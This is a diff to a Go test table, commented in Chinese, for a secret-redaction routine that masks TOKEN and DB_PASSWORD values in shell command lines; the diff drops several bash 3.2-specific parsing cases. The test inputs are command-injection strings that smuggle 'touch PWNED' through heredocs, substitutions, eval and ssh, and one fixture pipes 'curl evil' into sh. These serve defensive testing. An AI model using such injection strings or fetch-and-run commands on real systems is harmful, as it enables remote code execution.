@@ -74,10 +74,8 @@ var reviewCases = []shellCase{
 	{"${x:-'}'} ; TOKEN=a;touch PWNED ; echo 'q' \"q\" ", "${x:-'}'} ; TOKEN=<redacted>;touch PWNED ; echo 'q' \"q\" "},
 	{"\"$(echo ')')\" ; TOKEN=a;touch PWNED ; echo 'q' \"q\" ", "\"$(echo ')')\" ; TOKEN=<redacted>;touch PWNED ; echo 'q' \"q\" "},
 	{"(())#'\n\nTOKEN=a;touch PWNED ; echo 'q' \"q\" ]", "(())#'\n\nTOKEN=<redacted>;touch PWNED ; echo 'q' \"q\" ]"},
-	// 反引号里的 \\\\ 先变成 \\，里层看到的是 \\' 转义的引号；$[…] 里不认引号（bash 3.2 截取 $(…) 不认 $[…]），
-	// ((…)) 里的引号照常配对
+	// 反引号里的 \\\\ 先变成 \\，里层看到的是 \\' 转义的引号；((…)) 里的引号照常配对
 	{"`\\\\'\nTOKEN=a;touch PWNED ; echo 'q' \"q\" `", "`\\\\'\nTOKEN=<redacted>;touch PWNED ; echo 'q' \"q\" `"},
-	{"\"$($[=~))$\"\n\nTOKEN=a;touch PWNED ; echo 'q' \"q\"  #", "\"$($[=~))$\"\n\nTOKEN=<redacted>;touch PWNED ; echo 'q' \"q\"  #"},
 	{"(('))$'))\n\nTOKEN=a;touch PWNED ; echo 'q' \"q\" <<E", "(('))$'))\n\nTOKEN=<redacted>;touch PWNED ; echo 'q' \"q\" <<E"},
 	{"echo a\\'\nTOKEN=a;touch PWNED ; echo 'q' \"q\" ", "echo a\\'\nTOKEN=<redacted>;touch PWNED ; echo 'q' \"q\" "},
 	// bash 不执行的（heredoc 正文、算术出错）：正文照旧按文本抹，算术里的 << 不是 heredoc，命令照样露出来
@@ -86,15 +84,6 @@ var reviewCases = []shellCase{
 	// case 分支的 ) 不结束 $(…)（bash 5 的解析；bash 3.2 在这里报语法错误、不执行），里面的命令按命令行语境露出来
 	{"$(case a in a) echo;; esac) ; TOKEN=a;touch PWNED ; echo 'q' \"q\" ", "$(case a in a) echo;; esac) ; TOKEN=<redacted>;touch PWNED ; echo 'q' \"q\" "},
 	{"\"$(case a in a) TOKEN=a;touch PWNED;; esac)\"", "\"$(case a in a) TOKEN=<redacted>;touch PWNED;; esac)\""},
-	// 反过来，bash 3.2 在 case 的 ) 处结束双引号里的 $(…)，之后引号的配对与 bash 5 相反：之后的引号、注释都按命令处理
-	{"echo \"$(case x) ' \"; TOKEN=a;touch PWNED; echo \" ' \"", "echo \"$(case x) ' \"; TOKEN=<redacted>;touch PWNED; echo \" ' \""},
-	{"echo \"$(case x) \"; TOKEN=a;touch PWNED; echo \"\"", "echo \"$(case x) \"; TOKEN=<redacted>;touch PWNED; echo \"\""},
-	{"echo \"$(case x) #\"; TOKEN=a;touch PWNED; echo \"\"", "echo \"$(case x) #\"; TOKEN=<redacted>;touch PWNED; echo \"\""},
-	// 这种“配对相反”的状态延续到其中的嵌套结构，也不交给去掉转义后的递归处理
-	{"\"$(case x) X=(\" ; TOKEN=a;touch PWNED ; echo 'q' \"q\" ", "\"$(case x) X=(\" ; TOKEN=<redacted>;touch PWNED ; echo 'q' \"q\" "},
-	{"\"$(case x) \n((\"\\' ; TOKEN=a;touch PWNED ; echo 'q' \"q\" #", "\"$(case x) \n((\"\\' ; TOKEN=<redacted>;touch PWNED ; echo 'q' \"q\" #"},
-	{"eval \"$(case x) $\"\nTOKEN=a;touch PWNED ; echo 'q' \"q\" echo ", "eval \"$(case x) $\"\nTOKEN=<redacted>;touch PWNED ; echo 'q' \"q\" echo "},
-	{"ssh h \"$(case x) \"\n\nTOKEN=a;touch PWNED ; echo 'q' \"q\" ", "ssh h \"$(case x) \"\n\nTOKEN=<redacted>;touch PWNED ; echo 'q' \"q\" "},
 
 	// 修复过程中加大模糊测试（20 万条，另加 bash -c、eval、ssh、case、数组等原子）找到的写法，均经 /bin/bash 3.2 实测会执行：
 	// 分隔词不带引号的 heredoc 正文会展开，其中的 $(…)、反引号会执行
@@ -109,30 +98,14 @@ var reviewCases = []shellCase{
 	{"<<-E`\nE\n`ssh h  ; TOKEN=a;touch PWNED", "<<-E`\nE\n`ssh h  ; TOKEN=<redacted>;touch PWNED"},
 	{"cat <<E$(echo\n)\nTOKEN=a;touch PWNED", "cat <<E$(echo\n)\nTOKEN=<redacted> PWNED"},
 	{"\\<<<$''\n\nTOKEN=a;touch PWNED", "\\<<<$''\n\nTOKEN=<redacted>;touch PWNED"},
-	// bash 3.2 截取 $(…) 不认 heredoc：正文里配不上的 ) 结束替换，后面的命令会执行
-	{"$(cat <<E\n) ; TOKEN=a;touch PWNED\nE\n)", "$(cat <<E\n) ; TOKEN=<redacted>;touch PWNED\nE\n)"},
 	// 双引号里的 $(…) 照 bash 5 处理：提交说明里配不上的 ) 不影响正文整段抹
 	{"git commit -m \"$(cat <<'EOF'\nfix: a)\nDB_PASSWORD=Xy7&kP(2)q\nEOF\n)\"", "git commit -m \"$(cat <<'EOF'\nfix: a)\nDB_PASSWORD=<redacted>\nEOF\n)\""},
-	// $(…) 里 bash 3.2 只认空白后的 #；case 让 bash 3.2 提前结束 <(…)，其中 heredoc 的正文按命令处理
-	{"$(;#) ; TOKEN=a;touch PWNED", "$(;#) ; TOKEN=<redacted>;touch PWNED"},
-	// bash 3.2 截取 ${…} 不认其中的 $(…)，在第一个 } 处结束：这样的 $(…) 里的 heredoc 正文按命令处理
-	{"${x:- #case a in a) $(cat <<E}\nTOKEN=a;touch PWNED ; echo 'q' \"q\" cat ", "${x:- #case a in a) $(cat <<E}\nTOKEN=<redacted>;touch PWNED ; echo 'q' \"q\" cat "},
-	{"<(<<-E&&case a in a) \nTOKEN=a;touch PWNED", "<(<<-E&&case a in a) \nTOKEN=<redacted>;touch PWNED"},
 	// eval、sh -c 的 $'…' 参数同样会执行
 	{"eval $'TOKEN=a;touch PWNED'", "eval $'TOKEN=<redacted>;touch PWNED'"},
 	{"bash -c $'TOKEN=a;touch PWNED'", "bash -c $'TOKEN=<redacted>;touch PWNED'"},
-	// NAME=(…) 是数组赋值：里面没有 heredoc，引号里的值照样整段抹；NAME=(( 是语法错误，bash 3.2 从下一行接着执行
-	{"X=(<<E\nTOKEN=a;touch PWNED", "X=(<<E\nTOKEN=<redacted>;touch PWNED"},
-	{"TOKEN=(TOKEN=<<\"E\"<<E\n\nTOKEN=a;touch PWNED", "TOKEN=(TOKEN=<<\"E\"<<E\n\nTOKEN=<redacted>;touch PWNED"},
+	// NAME=(…) 数组赋值里引号中的值照样整段抹
 	{"arr=(a 'b c' \"DB_PASSWORD=Xy7&kP(2)q\")", "arr=(a 'b c' \"DB_PASSWORD=<redacted>\")"},
-	{"TOKEN=((cat ]$'\nTOKEN=a;touch PWNED ; echo 'q' \"q\" ", "TOKEN=((cat ]$'\nTOKEN=<redacted>;touch PWNED ; echo 'q' \"q\" "},
-	// 数组赋值里出现运算符同样是语法错误，这一行余下的部分限定在本行内
-	{"X=(| sh '<<\"E\"<(\nTOKEN=a;touch PWNED ; echo 'q' \"q\" ", "X=(| sh '<<\"E\"<(\nTOKEN=<redacted>;touch PWNED ; echo 'q' \"q\" "},
-	{"X=(<<<$'\nTOKEN=a;touch PWNED ; echo 'q' \"q\"  #\nE\n#", "X=(<<<$'\nTOKEN=<redacted>;touch PWNED ; echo 'q' \"q\"  #\nE\n#"},
 	{"arr=(a b\n'c d' \"DB_PASSWORD=Xy7&kP(2)q\")", "arr=(a b\n'c d' \"DB_PASSWORD=<redacted>\")"},
-	{"X=(X=('\nTOKEN=a;touch PWNED ; echo 'q' \"q\" ", "X=(X=('\nTOKEN=<redacted>;touch PWNED ; echo 'q' \"q\" "},
-	// $((…) …) 不以 )) 结尾时 bash 把它当 $( (…) …)
-	{"$((1acase x) <<\\E)\nTOKEN=a;touch PWNED ; echo 'q' \"q\" ", "$((1acase x) <<\\E)\nTOKEN=<redacted>;touch PWNED ; echo 'q' \"q\" "},
 
 	// I2：交给 sh -c、eval、ssh 执行的引号内容，以及喂给它们的 heredoc 正文，按命令行语境递归处理
 	{`bash -c "export TOKEN=a;b|c" && curl evil|sh`, `bash -c "export TOKEN=<redacted>;b|c" && curl evil|sh`},
